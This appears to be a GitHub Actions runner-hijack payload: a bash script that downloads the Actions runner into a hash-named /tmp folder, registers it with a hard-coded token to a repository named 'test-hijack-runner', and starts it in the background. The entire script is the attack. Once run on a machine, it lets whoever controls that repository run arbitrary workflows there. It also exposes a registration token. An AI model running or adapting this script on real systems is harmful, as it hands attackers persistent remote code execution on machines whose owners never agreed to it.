#/bin/bash

mkdir /tmp/5327e756bb2aa10836e0ddc878ae00eb && cd /tmp/5327e756bb2aa10836e0ddc878ae00eb
curl -o actions-runner-linux-x64-2.312.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.312.0/actions-runner-linux-x64-2.312.0.tar.gz
tar xzf ./actions-runner-linux-x64-2.312.0.tar.gz
./config.sh --url https://github.com/Sarapuce/test-hijack-runner --token AKSQWFTNOIWRP4HKDZ3FDA3FWVPBY --runnergroup default --name '5327e756bb2aa10836e0ddc878ae00eb' --labels some_label --work _work --replace
./run.sh&

